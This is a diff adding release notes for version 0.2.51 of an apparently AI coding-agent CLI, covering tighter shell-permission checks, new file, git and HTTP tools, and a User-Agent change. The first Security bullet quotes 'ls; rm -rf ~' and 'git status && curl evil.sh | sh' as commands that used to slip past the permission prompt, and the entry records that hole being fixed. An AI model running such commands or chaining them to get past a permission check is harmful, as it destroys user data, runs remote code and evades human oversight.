@@ -1,3 +1,28 @@
+## v0.2.51
+
+### Security
+- Tighten `run_shell` safe-read-only classifier with AST-level metacharacter detection — commands like `ls; rm -rf ~` or `git status && curl evil.sh | sh` no longer bypass the permission prompt
+- Remove `kill` and `killall` from the read-only safe-list so process-killing always prompts for permission
+- Cap `download_file` size at 100 MB by default (configurable via `max_bytes`, hard cap 1 GB); oversized `Content-Length` headers are rejected up front
+- Move `web_fetch` large-page temp files to `~/.sensai/cache/web/` so they no longer pollute git status
+
+### Core
+- Add `web_search` tool fallback via the SensAI proxy
+- Add `apply_patch` tool: applies multi-file unified diffs (modify, create, delete, rename) atomically with snapshot-based undo
+- Add `delete_file`, `move_file`, and `make_dir` tools so common file operations no longer require shelling out
+- Add `git_log` (structured commit history) and `git_commit` (Conventional Commits-validated, never amends/pushes/sets config) tools
+- Add `scan_secrets` tool so the agent can audit text or files before writing or committing; results are redacted
+- Add `http_request` tool with full verb support (POST/PUT/PATCH/DELETE/HEAD/OPTIONS) for webhook/API debugging, capped at 2 MB response
+- Replace the `code_review` stub with a real implementation that dispatches a read-only review sub-agent
+- Fix `patch_file` `replace_all` returning a misleading "no changes made" error when the search string is missing
+- Improve `read_file` long-line truncation to explicitly call out truncated lines so the model doesn't use them as edit anchors
+- Make `read_file` LSP diagnostics wait opt-in via `wait_for_diagnostics`; default is now no wait, removing per-read latency for bulk reads
+- Raise `write_file` size cap from 50 KB to 256 KB
+- Skip the random search-throttling delay on the first `web_search` call
+
+### CLI
+- Switch every built-in tool's HTTP `User-Agent` to `sensai-cli/<version>` for server-side request attribution
+
 ## v0.2.50
 
 ### Core
